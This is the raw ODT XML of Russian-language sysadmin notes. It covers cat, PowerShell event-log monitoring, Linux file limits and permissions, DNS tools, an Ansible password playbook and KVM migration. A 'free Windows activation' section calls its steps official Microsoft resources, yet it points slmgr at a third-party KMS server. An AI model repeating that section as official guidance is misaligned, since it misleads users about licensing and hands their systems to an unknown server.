      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">То есть происходит простое соединение файлов. К содержимому одного добавляется содержимое другого. Это касается не только текстовых файлов, но и всех остальных (бинарных, например). Чтобы объединить два файла командой cat нужно просто указать в качестве аргументов названия этих файлов и направить результат выполнения в новый файл. Например, мы хотим объединить два файла file1 и file2, а результат записать в новый файл file12. Тогда мы должны выполнить следующую команду:</text:p>
      <text:p text:style-name="P1">cat file1 file2 &gt; file12</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Вы можете объединить неограниченное количество файлов. Например, чтобы объединить четыре файла и записать результат в файл myfile, выполните команду:</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">cat file1 file2 file3 file4 &gt; myfile</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Powershell мониторинг событий 41, 1074, 6008:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">|||Мониторинг по событию </text:span><text:span text:style-name="T2">41:|||</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 41} |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ForEach-Object {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>$flam = New-Object PSObject | Select-Object Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>if ($_.ReplacementStrings[4]) {</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>$flam.Date = $_.TimeGenerated</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>$flam</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $StrData + " " + "</text:span><text:span text:style-name="T3">Сервер</text:span><text:span text:style-name="T2">: $env:computername" + " " + "</text:span><text:span text:style-name="T3">Система</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">перезагрузилась</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">завершив</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">работу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ошибками</text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="T3">Возможные причины ошибки: система перестала отвечать на запросы, произошел критический сбой или неожиданно отключилось питание."</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">|||</text:span><text:span text:style-name="T3">Мониторинг</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">по</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">событию</text:span><text:span text:style-name="T2"> 1074:|||</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 1074}</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pan text:style-name="T2">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$FlamDat.Action = $_.ReplacementStrings[4]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">|||</text:span><text:span text:style-name="T3">Мониторинг</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">по</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">событию</text:span><text:span text:style-name="T2"> 6008|||</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 6008}</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oft-page-break/><text:span text:style-name="T2">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$FlamDat.Action = $_.Message</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как найти количество открытых файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1">Значение сохраняется в</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2"><text:span text:style-name="T3">Проверка </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> лимит в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ulimit</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">Hn</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверка </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> лимит в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ulimit</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">Sn</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Чтобы просмотреть значения </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> для разных пользователей, переключите пользователя с «</text:span><text:span text:style-name="T2">su</text:span><text:span text:style-name="T3">» на пользователя, ограничения которого вы хотите проверить.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Например:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># su root</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Sn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">MySQL</text:span><text:span text:style-name="T3"> / </text:span><text:span text:style-name="T2">MariaDB</text:span><text:span text:style-name="T3"> или веб-сервер </text:span><text:span text:style-name="T2">Apache</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вы можете увеличить лимит открытых файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, отредактировав опцию ядра </text:span><text:span text:style-name="T2">fs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">max</text:span><text:span text:style-name="T3">. Для этого используйте утилиту </text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Sysctl</text:span><text:span text:style-name="T3"> используется для настройки параметров ядра.</text:span></text:p>
      <text:p text:style-name="P1">Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</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1">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text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">vi</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P1">Добавьте следующую команду:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">max</text:span><text:span text:style-name="T3">=500000</text:span></text:p>
      <text:p text:style-name="P1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</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2"><text:soft-page-break/><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка количества открытых файлов для пользователя в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">, вам необходимо отредактировать следующий файл:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">vi</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">security</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">limits</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если вы администратор </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, предлагаем Вам ознакомиться с этим файлом.</text:span></text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P1">Команды, которые вы должны добавить, имеют следующие параметры:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">item</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">value</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вот пример установки </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> лимитов для пользователя </text:span><text:span text:style-name="T2">dimon</text:span><text:span text:style-name="T3">:</text:spa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11" loext:marker-style-name="T1"><text:span text:style-name="T2">dimon</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">soft</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">nofile</text:span><text:span text:style-name="T3"> 1024</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Работа с правами доступа файлов и директорий в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем файла </text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> и назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">:</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Установить полные права доступа </text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">Read</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Write</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eXecute</text:span><text:span text:style-name="T3"> ) для всех </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Other</text:span><text:span text:style-name="T3"> ) на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> 777 </text:span><text:span text:style-name="T2">directory</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">go</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Удалить все права на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chgrp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Изменить группу-владельца для </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</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становить так называемый </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит на директорию /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">. Удалить файл в такой директории может только владелец данного файла</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далить </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит с директории /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u+s /bin/binary_file - </text:span><text:span text:style-name="T3">Установить</text:span><text:span text:style-name="T2"> SUID-</text:span><text:span text:style-name="T3">бит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> /bin/binary_file. </text:span><text:span text:style-name="T3">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g+s /home/public - </text:span><text:span text:style-name="T3">Установить</text:span><text:span text:style-name="T2"> SGID-</text:span><text:span text:style-name="T3">бит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директории</text:span><text:span text:style-name="T2"> /home/public</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">perm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T2">SUID</text:span><text:span text:style-name="T3"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lh</text:span><text:span text:style-name="T3"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Скрипты для диагностики </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">TESTER</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Тестирование скорости ответа </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> со статистикой превышения, минимума, максимума - </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3">0</text:span><text:span text:style-name="T2">zgen</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dns</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tester</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BENCH</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">DNS</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Простой скрипт для тестирования загрузки </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">. Написан на языке </text:span><text:span text:style-name="T2">Go</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3">0</text:span><text:span text:style-name="T2">zgen</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bench</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">dns</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CHECK-DNS-SERVERS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверка</text:span><text:span text:style-name="T2"> DNS - </text:span><text:span text:style-name="T3">Дата</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сертификата</text:span><text:span text:style-name="T2">, DNS resolve, HTTP 200 - https://github.com/m0zgen/check-dns-servers</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">MAC-DNS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD - https://github.com/m0zgen/mac-dns</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BLD</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">LOOKUP</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Соберите все </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адреса </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BLD</text:span><text:span text:style-name="T3"> и попытайтесь разрешить целевой домен с каждым </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BLD</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3">0</text:span><text:span text:style-name="T2">zgen</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bld</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lookup</text:span></text:p>
      <text:p text:style-name="P1">Как сменить пароль Linux пользователя при помощи Ansible: </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">change_password.yml</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">---</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">- name: user module demo</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>hosts: all</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>become: true</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>vars:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>myuser: "example"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>mypassword: "password"</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>tasks:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>- name: change password</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="6"/>ansible.builtin.user:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>name: "{{ myuser }}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>state: present</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>password: "{{ mypassword | password_hash('sha512') }}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запуск</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">ansible-playbook change_password.yml</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как бесплатно активировать Windows? Если вы столкнулись с проблемой лицензирования Windows, попробуйте обратиться к официальным ресурсам Microsoft. Компания предоставляет универсальные ключи многократной установки, которые помогут активировать Windows. Для активации:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">1. Пройдите по ссылке (https://learn.microsoft.com/ru-ru/windows-server/get-started/kms-client-activation-keys) и скопируйте ключ, подходящий под вашу версию Windows.</text:span></text:p>
      <text:p text:style-name="P1">2. В поиске введите «cmd», тапните правой кнопкой по приложению «Командная строка» и выберите «Запуск от имени администратора».</text:p>
      <text:p text:style-name="P1">3. Введите команду «slmgr/ipk &lt;ваш_скопированный_ключ&gt;».</text:p>
      <text:p text:style-name="P1">4. После введите «slmgr /skms kms.digiboy.ir».</text:p>
      <text:p text:style-name="P1">5. Последняя команда «slmgr /ato».</text:p>
      <text:p text:style-name="P7">Если все сделано правильно, вы получите сообщение об успешной активации Windows.</text:p>
      <text:p text:style-name="P1">KVM быстрый перенос виртуальной машины на другой сервер. Представим, что есть несколько гипервизоров - server1 и server2, как быстро перенести виртуального гостя с одного сервера, на другой? Очень просто. Действия на server1:</text:p>
      <text:p text:style-name="P1">Выключить машину: virsh shutdown vm1</text:p>
      <text:p text:style-name="P1">Сделать дамп конфигурации машины: virsh dumpxml vm1 &gt; ~/vm1.xml</text:p>
      <text:p text:style-name="P1">Скопировать данные на другой хост:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">scp ~/vm1.xml server2:/path/to/folder/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">scp /var/lib/libvirt/images/vm1.qcow2 server2:/var/lib/libvirt/images/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Действия</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> server2:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Импортировать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">конфиг</text:span><text:span text:style-name="T2">: virsh define /path/to/folder/vm1.xml</text:span></text:p>
      <text:p text:style-name="P1">Запустить виртуалную машину:virsh start vm1</text:p>
      <text:p text:style-name="P1">Удаление виртуальной машины KVM:</text:p>
      <text:p text:style-name="P1">Удалить машину: virsh undefine vm1</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удалить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">диск</text:span><text:span text:style-name="T2">: virsh vol-delete --pool default vm1</text:span></text:p>
      <text:p text:style-name="P7">Убедиться, что файл образа так же удален: rm /var/lib/libvirt/images/vm1.qcow2</text:p>
      <text:p text:style-name="P1">Безопасность Linux (серия из 5 частей):</text:p>
      <text:p text:style-name="P1">1. Некоторые мысли о безопасности Linux (https://dev.to/jmau111/some-thoughts-about-linux-security-545n);</text:p>
      <text:p text:style-name="P1">2. Bash-скрипт для настройки Linux (https://dev.to/jmau111/a-bash-script-to-configure-linux-565n);</text:p>
      <text:p text:style-name="P13">3. Как проверить Linux-машину (https://dev.to/jmau111/how-to-inspect-a-linux-machine-4p49);</text:p>
      <text:p text:style-name="P13">4. Мысли о безопасности ОС (https://dev.to/jmau111/thoughts-on-os-security-4gmk);</text:p>
